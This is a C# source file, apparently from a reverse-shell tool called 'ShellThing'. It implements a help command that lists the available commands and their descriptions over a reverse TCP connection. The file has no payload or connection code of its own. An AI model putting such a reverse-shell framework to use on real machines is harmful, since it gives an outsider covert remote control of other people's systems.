using System;
using System.Collections;
using System.Collections.Generic;
using System.Text;

namespace ShellThing
{
    /// <summary>
    /// Prints help for all or a particular set of commands stored in the CommandInvoker's 'commands' hashtable. 
    /// </summary>
    class HelpCommand : ICommand
    {
        TcpReverseConnection connection;

        private Hashtable commands = new Hashtable();

        public HelpCommand(Hashtable commands)
        {
            // Pass in the hashtable containing all of the commands - so that we can call their Help() functions
            this.commands = commands;
        }

        public void Execute(TcpReverseConnection connection, string[] commandArguments)
        {
            this.connection = connection;
            Dictionary<string, string> helpText = new Dictionary<string, string>();

            // Check whether to display generic info about each command, or syntax information and example for a specific command
            if (commandArguments.Length == 2)
            {

                if (commands.ContainsKey(commandArguments[1]))
                {
                    ICommand c = (ICommand)commands[commandArguments[1]];
                    helpText = c.Help(true);

                    foreach (string commandName in helpText.Keys)
                    {
                        connection.SendData($"{commandName}{new string(' ', (25 - commandName.Length))}{helpText[commandName]}\n");
                    }
                }
                else
                {
                    connection.SendData($"Help: Invalid argument - no command '{commandArguments[1]}' exists\n");
                }
            }
            // Just get generic help text for each command
            else if (commandArguments.Length == 1)
            {
                List<Type> completedCommands = new List<Type>();

                connection.SendData("Core Commands\n=============\n\n");
                connection.SendData($"Command{new string(' ', 18)}Description\n-------{new string(' ', 18)}-----------\n");

                foreach (string command in commands.Keys)
                {
                    // Check whether helpText has already been displayed for another instance of the command
                    if (completedCommands.Contains(commands[command].GetType()))
                    {
                        continue;
                    }
                    else
                    {
                        var c = (ICommand)commands[command];
                        helpText = c.Help(false);


                        foreach (string commandName in helpText.Keys)
                        {
                            connection.SendData($"{commandName}{new string(' ', (25 - commandName.Length))}{helpText[commandName]}\n");
                        }

                        completedCommands.Add(commands[command].GetType());
                    }
                }
            }
            else
            {
                connection.SendData("Help: Error - too many arguments\n");
            }
        }

        public Dictionary<string, string> Help(bool includeSyntax)
        {
            Dictionary<string, string> helpText = new Dictionary<string, string>();
            helpText.Add("help", "Help Menu");

            return helpText;
        }
    }
}
